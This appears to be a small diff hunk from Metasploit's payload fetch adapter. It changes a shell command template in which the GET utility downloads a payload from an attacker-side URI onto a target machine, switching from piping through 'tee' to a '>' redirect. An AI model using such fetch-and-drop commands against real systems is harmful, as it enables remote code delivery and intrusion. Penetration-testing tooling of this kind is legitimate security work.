@@ -393,7 +393,7 @@ module Msf::Payload::Adapter::Fetch
     # Specifying the method (-m GET) is necessary on OSX
     case fetch_protocol
     when 'HTTP'
-      get_file_cmd = "GET -m GET http://#{download_uri(uri)} | tee #{_remote_destination}"
+      get_file_cmd = "GET -m GET http://#{download_uri(uri)}>#{_remote_destination}"
     when 'HTTPS'
       unless datastore['FETCH_CHECK_CERT']
         # There is no way to disable cert check in GET ...
